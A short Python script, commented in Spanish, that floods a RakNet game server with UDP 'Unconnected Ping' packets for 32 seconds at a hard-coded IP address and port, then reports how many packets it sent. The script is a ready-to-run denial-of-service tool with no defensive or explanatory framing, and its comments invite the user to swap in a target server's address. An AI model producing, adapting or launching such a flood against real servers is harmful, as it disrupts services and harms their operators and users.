import struct
import time
import socket

ip = "163.5.120.163"      # Cambia por la IP del servidor objetivo
port = 25535          # Cambia por el puerto del servidor RakNet

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
end_time = time.time() + 32  # Duración: 32 segundos

count = 0
while time.time() < end_time:
    packet_id = 0x01
    timestamp = int(time.time() * 1000)
    magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    packet = struct.pack('!B', packet_id)
    packet += struct.pack('>Q', timestamp)
    packet += magic

    sock.sendto(packet, (ip, port))
    count += 1

print(f"Enviados {count} paquetes Unconnected Ping en 32 segundos a {ip}:{port}")
